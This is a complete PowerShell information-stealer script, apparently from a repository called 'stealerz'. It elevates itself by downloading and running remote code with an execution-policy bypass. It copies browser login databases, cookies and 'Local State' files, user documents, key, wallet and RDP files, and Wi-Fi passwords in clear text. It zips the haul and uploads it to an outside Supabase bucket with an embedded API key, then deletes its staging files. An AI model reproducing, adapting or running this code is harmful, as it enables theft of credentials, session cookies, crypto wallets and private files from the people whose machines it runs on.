$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $url = "https://raw.githubusercontent.com/KaloyanSyS32/stealerz/refs/heads/main/s.js"
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$url')`""
    exit
}

$sbUrl = "https://kjoxaevacnruadftkjxc.supabase.co/storage/v1/object/data/$($env:COMPUTERNAME)_$(Get-Date -Format "yyyyMMdd_HHmm").zip"
$sbKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtqb3hhZXZhY25ydWFkZnRranhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxNjA4NjAsImV4cCI6MjA5MzczNjg2MH0.OVuVfwrLPgxcrX3W0xjF-FVQBB9qMbMB1s-vL8aV_aY"

$staging = Join-Path $env:TEMP "staging_$(Get-Random)"
New-Item -Path $staging -ItemType Directory -Force | Out-Null

# Function to bypass File Locks (IOException)
function Copy-LockedFile ($Source, $Destination) {
    try {
        $InStream = New-Object System.IO.FileStream($Source, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $OutStream = New-Object System.IO.FileStream($Destination, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::Read)
        $InStream.CopyTo($OutStream)
        $InStream.Close(); $OutStream.Close()
    } catch { Copy-Item $Source -Destination $Destination -Force -ErrorAction SilentlyContinue }
}

# 1. Browser Extraction with Lock Bypass
$browsers = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
}

foreach ($b in $browsers.GetEnumerator()) {
    if (Test-Path $b.Value) {
        $dest = New-Item -Path (Join-Path $staging "Browsers\$($b.Key)") -ItemType Directory -Force
        if (Test-Path "$($b.Value)\Local State") { Copy-Item "$($b.Value)\Local State" -Destination $dest }
        
        Get-ChildItem -Path $b.Value -Recurse -Include "Login Data", "Cookies", "Web Data" -ErrorAction SilentlyContinue | ForEach-Object {
            Copy-LockedFile -Source $_.FullName -Destination (Join-Path $dest $_.Name)
        }
    }
}

# 2. Files
$exts = @("*.txt", "*.pdf", "*.docx", "*.xlsx", "*.key", "*.wallet", "*.rdp")
Get-ChildItem -Path "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop" -Include $exts -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
    $fDest = Join-Path $staging "Files"
    if (-not (Test-Path $fDest)) { New-Item $fDest -ItemType Directory -Force | Out-Null }
    Copy-Item $_.FullName -Destination $fDest -ErrorAction SilentlyContinue
}

# 3. Recon using Absolute Paths
$recon = Join-Path $staging "Recon"
New-Item $recon -ItemType Directory -Force | Out-Null
$sys32 = "$env:SystemRoot\System32"

& "$sys32\netsh.exe" wlan export profile key=clear folder=$recon | Out-Null
& "$sys32\ipconfig.exe" /all > (Join-Path $recon "net.txt")
Get-Process | Select-Object Name, CPU | Export-Csv -Path (Join-Path $recon "procs.csv") -NoTypeInformation

# 4. Final Exfil
$zip = "$env:TEMP\upload.zip"
Compress-Archive -Path "$staging\*" -DestinationPath $zip -Force

$headers = @{ "Authorization" = "Bearer $sbKey"; "apikey" = $sbKey; "Content-Type" = "application/zip"; "x-upsert" = "true" }
$bytes = [System.IO.File]::ReadAllBytes($zip)
Invoke-RestMethod -Uri $sbUrl -Method Post -Headers $headers -Body $bytes

Remove-Item $staging -Recurse -Force
Remove-Item $zip -Force
